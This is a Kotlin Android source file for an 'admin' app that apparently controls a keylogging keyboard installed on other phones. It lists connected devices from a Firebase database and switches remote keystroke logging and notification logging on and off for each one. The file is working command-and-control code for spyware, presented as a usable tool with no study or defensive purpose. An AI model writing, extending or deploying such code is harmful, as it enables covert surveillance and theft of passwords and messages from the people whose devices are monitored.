package com.example.mykeyboardadmin

import android.graphics.Color
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

class AdminMainActivity : AppCompatActivity() {

    private lateinit var recyclerView: RecyclerView
    private val deviceList = mutableListOf<DeviceModel>()
    private lateinit var adapter: DeviceAdapter
    private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"

    data class DeviceModel(
        val name: String,
        var keylogging: Boolean = true,
        var notifications: Boolean = true
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        setContentView(R.layout.activity_admin_main)

        recyclerView = findViewById(R.id.recyclerViewDevices)
        recyclerView.layoutManager = LinearLayoutManager(this)
        adapter = DeviceAdapter(deviceList) { device, type, newState ->
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
            if (type == "key") {
                device.keylogging = newState
                ref.child("keylogging").setValue(newState)
            } else {
                device.notifications = newState
                ref.child("notifications").setValue(newState)
            }
            adapter.notifyDataSetChanged()
        }
        recyclerView.adapter = adapter

        loadConnectedDevices()
    }

    private fun loadConnectedDevices() {
        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands")
        dbRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    val deviceName = child.key ?: continue
                    if (deviceList.none { it.name == deviceName }) {
                        val device = DeviceModel(deviceName)
                        deviceList.add(device)
                        listenToDeviceState(deviceName)
                    }
                }
                adapter.notifyDataSetChanged()
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenToDeviceState(deviceName: String) {
        val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
        cmdRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val keyObj = snapshot.child("keylogging").value
                val key = when (keyObj) {
                    is Boolean -> keyObj
                    is String -> keyObj.toBoolean()
                    else -> true
                }

                val notifObj = snapshot.child("notifications").value
                val notif = when (notifObj) {
                    is Boolean -> notifObj
                    is String -> notifObj.toBoolean()
                    else -> true
                }

                val index = deviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    deviceList[index].keylogging = key
                    deviceList[index].notifications = notif
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    class DeviceAdapter(
        private val devices: List<DeviceModel>,
        private val onToggle: (DeviceModel, String, Boolean) -> Unit
    ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {

        class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val txtName: TextView = view.findViewById(R.id.txtDeviceName)
            val btnKey: Button = view.findViewById(R.id.btnToggleKeyLog)
            val btnNotif: Button = view.findViewById(R.id.btnToggleNotifLog)
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_device_control, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val device = devices[position]
            holder.txtName.text = "📱 Device: ${device.name}"

            if (device.keylogging) {
                holder.btnKey.text = "Key Logger: ON"
                holder.btnKey.setBackgroundColor(Color.parseColor("#388E3C"))
            } else {
                holder.btnKey.text = "Key Logger: OFF"
                holder.btnKey.setBackgroundColor(Color.parseColor("#C62828"))
            }

            if (device.notifications) {
                holder.btnNotif.text = "Notif Logger: ON"
                holder.btnNotif.setBackgroundColor(Color.parseColor("#388E3C"))
            } else {
                holder.btnNotif.text = "Notif Logger: OFF"
                holder.btnNotif.setBackgroundColor(Color.parseColor("#C62828"))
            }

            holder.btnKey.setOnClickListener {
                onToggle(device, "key", !device.keylogging)
            }

            holder.btnNotif.setOnClickListener {
                onToggle(device, "notif", !device.notifications)
            }
        }

        override fun getItemCount() = devices.size
    }
}
